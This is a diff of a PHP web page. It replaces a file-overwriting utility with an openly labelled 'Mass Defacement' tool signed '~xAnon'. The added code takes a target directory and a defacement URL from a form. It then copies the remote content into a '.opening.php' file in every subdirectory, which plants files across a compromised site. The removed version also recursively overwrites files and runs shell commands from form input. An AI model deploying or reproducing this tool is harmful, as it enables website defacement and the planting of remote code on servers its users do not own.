@@ -1,118 +1,67 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Content Changer</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .container {
-            background-color: #222;
-            padding: 20px;
-            border-radius: 10px;
-            width: 80%;
-            max-width: 600px;
-        }
-        input[type="text"], textarea, input[type="submit"], select {
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #fff;
-            border-radius: 5px;
-            background-color: #333;
-            color: #fff;
-        }
-        textarea {
-            width: 100%;
-            height: 150px;
-        }
-        input[type="submit"] {
-            cursor: pointer;
-        }
-        .result {
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <?php
-        // Display the server document root path at the top of the page
-        $documentRoot = $_SERVER['DOCUMENT_ROOT'];
-        echo "<p>Document Root Path: $documentRoot</p>";
-        ?>
-        <h1>Change File Content</h1>
-        <form method="post">
-            <label for="directory">Directory Path:</label><br>
-            <input type="text" id="directory" name="directory" required><br><br>
-            <label for="filename">File Name to Search:</label><br>
-            <input type="text" id="filename" name="filename" required><br><br>
-            <label for="content">New Content:</label><br>
-            <textarea id="content" name="content" required></textarea><br><br>
-            <input type="submit" value="Change Content">
-        </form>
-        <?php
-        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-            $directory = $_POST['directory'];
-            $filename = basename($_POST['filename']);
-            $newContent = $_POST['content'];
+<link rel="SHORTCUT ICON" href="http://imageshack.us/a/img716/272/philippineflagsourcec0d.gif" type="image">
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
+<style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), url(http://cur.cursors-4u.net/cursors/cur-9/cur862.png), progress !important;}</style>
+<title>Mass </title>
+<center><img src="http://oi44.tinypic.com/k2my3b.jpg height=" width="320"></center>
+<center><font color="white" face="Orbitron"><b>Mass Defacement</td></b></center>
+<?php
 
-            function changeContent($dir, $filename, $newContent) {
-                $result = '';
-                $items = scandir($dir);
-                foreach ($items as $item) {
-                    if ($item == '.' || $item == '..') {
-                        continue;
-                    }
-                    $path = $dir . DIRECTORY_SEPARATOR . $item;
-                    if (is_dir($path)) {
-                        $result .= changeContent($path, $filename, $newContent);
-                    } else {
-                        if (basename($path) == $filename) {
-                            if (file_put_contents($path, $newContent) !== false) {
-                                $result .= "Content changed for: $path<br>";
-                            } else {
-                                $result .= "Failed to change content for: $path<br>";
-                            }
+echo "<center><textarea rows='100' cols='100'>";
+$defaceurl = $_POST['massdefaceurl'];
+$dir = $_POST['massdefacedir'];
+echo $dir."\n";
+ 
+if (is_dir($dir)) {
+    if ($dh = opendir($dir)) {
+        while (($file = readdir($dh)) !== false) {
+                        if(filetype($dir.$file)=="dir"){
+                                $newfile=$dir.$file."/.opening.php";
+                                echo $newfile."\n";
+                                if (!copy($defaceurl, $newfile)) {
+                                        echo "failed to copy $file...\n";
+                                }
                         }
-                    }
-                }
-                return $result;
-            }
-
-            // Validate and use the provided directory path
-            $sanitizedDirectory = realpath($_POST['directory']);
-            if ($sanitizedDirectory && is_dir($sanitizedDirectory)) {
-                echo '<div class="result">';
-                echo changeContent($sanitizedDirectory, $filename, $newContent);
-                echo '</div>';
-
-                // Display directory contents
-                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-                    // For Windows
-                    $files = shell_exec("dir " . escapeshellarg($sanitizedDirectory));
-                } else {
-                    // For Unix/Linux
-                    $files = shell_exec("ls -l " . escapeshellarg($sanitizedDirectory));
-                }
-                echo '<div class="result">';
-                echo "<h2>Directory Contents:</h2><pre>$files</pre>";
-                echo '</div>';
-            } else {
-                echo '<div class="result">Invalid directory path.<br></div>';
-            }
         }
-        ?>
-    </div>
-</body>
-</html>
+        closedir($dh);
+    }
+}
+echo "</textarea></center>";
+?>
+<font color="white">
+<body bgcolor="#000000">
+<font face="Iceland">
+<br>
+<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
+[+] Main Directory: <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
+<br><br>
+[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
+<br>
+<br>
+<input type='submit' name='execmassdeface' value='Execute'></form></td>
+ 
+ 
+
+<br><br><br>
+<font size="5">
+** Main Directory = The Directory you want to mass deface (Must have read/write permission) **<br>
+<font face="Iceland"><b>Edit by ~xAnon</b>
+</body></html>
+
+<center>
+<?php
+// get an IP address
+$ip = $_SERVER['REMOTE_ADDR'];
+// display it back
+echo "Your IP : " . $ip;
+?>
+<font> | </font>
+<?php
+// get an IP address
+$server = $_SERVER['SERVER_ADDR'];
+echo "Server IP : " . $server;
+?>
+<br><br>
+
+</font size="5">
+</center>
